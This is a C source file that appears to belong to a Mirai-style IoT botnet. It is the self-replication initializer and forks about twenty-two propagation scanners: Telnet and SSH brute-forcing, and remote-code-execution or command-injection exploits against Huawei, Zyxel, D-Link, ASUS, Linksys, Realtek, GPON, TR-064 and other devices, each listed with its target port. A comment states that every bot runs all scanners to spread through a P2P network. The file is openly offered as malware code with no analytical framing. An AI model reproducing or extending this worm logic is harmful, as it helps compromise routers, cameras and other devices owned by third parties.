#include "includes.h"
#include "selfrep.h"

/* ============================================================================
 * SELF-REPLICATION - Master Initializer
 * ============================================================================
 * Every bot runs ALL scanners to spread through the P2P torrent network.
 * Each scanner forks into its own process and runs independently.
 * ============================================================================ */

#ifdef SELFREP

/* Simple scanners (connect + exploit in one shot) */
#include "selfrep_scanner.h"     /* Telnet brute-force (port 23) */
#include "selfrep_ssh.h"         /* SSH brute-force (port 22) */
#include "selfrep_huawei.h"      /* Huawei SOAP RCE (port 37215) */
#include "selfrep_zyxel.h"       /* Zyxel command injection (port 8080) */
#include "selfrep_dvr.h"         /* DVR camera exploit (port 80) */
#include "selfrep_zhone.h"       /* Zhone ONT/OLT exploit (port 80) */
#include "selfrep_fiber.h"       /* Fiber/GPON exploit (port 80) */
#include "selfrep_hilink.h"      /* HiLink exploit (port 80) */
#include "selfrep_thinkphp.h"    /* ThinkPHP framework RCE (port 80) */
#include "selfrep_telnetbypass.h" /* Telnet auth bypass (port 23) */

/* Raw socket SYN scanners */
#include "selfrep_adb.h"         /* ADB/UPnP RCE (port 5555) */
#include "selfrep_dlink.h"       /* D-Link SOAP RCE (port 80/8080) */
#include "selfrep_asus.h"        /* ASUS router command injection (port 8080) */
#include "selfrep_jaws.h"        /* JAWS web server exploit (port 80) */
#include "selfrep_linksys.h"     /* Linksys WRT exploit (port 55555) */
#include "selfrep_linksys8080.h" /* Linksys port 8080 variant */
#include "selfrep_hnap.h"        /* HNAP1 SOAP RCE (port 8081) */
#include "selfrep_netlink.h"     /* Netlink router exploit (port 1723) */
#include "selfrep_tr064.h"       /* TR-064 SOAP exploit (port 7547) */
#include "selfrep_realtek.h"     /* Realtek SDK UPnP exploit (port 52869) */
#include "selfrep_goahead.h"     /* GoAhead web server exploit (port 81) */
#include "selfrep_gpon_scanner.h" /* GPON command injection (port 80/8080) */

void selfrep_init(void) {
    /* Fork and start ALL scanners */

    /* Simple scanners (connect + exploit) */
    telnet_scanner_init();       /* Telnet brute-force */
    ssh_scanner_init();           /* SSH brute-force */
    huawei_scanner_init();        /* Huawei SOAP RCE */
    zyxel_scanner_init();         /* Zyxel CGI injection */
    dvr_scanner_init();           /* DVR camera exploit */
    zhone_scanner_init();         /* Zhone ONT/OLT */
    fiber_scanner_init();         /* Fiber/GPON */
    hilink_scanner_init();        /* HiLink */
    thinkphp_scanner_init();      /* ThinkPHP RCE */
    telnetbypass_scanner_init();  /* Telnet auth bypass */

    /* Raw socket SYN scanners */
    exploit_init();               /* ADB/UPnP RCE */
    dlinkscanner_scanner_init();  /* D-Link */
    asus_scanner_init();          /* ASUS router */
    jaws_scanner();               /* JAWS web server */
    linksys_scanner_init();       /* Linksys WRT */
    linksysscanner_scanner_init(); /* Linksys 8080 */
    hnapscanner_scanner_init();   /* HNAP1 */
    netlink_scanner();            /* Netlink */
    tr064_scanner();              /* TR-064 */
    realtek_scanner();            /* Realtek UPnP */
    goahead_init();               /* GoAhead */
    gpon_scanner_init();          /* GPON */
}

#endif /* SELFREP */
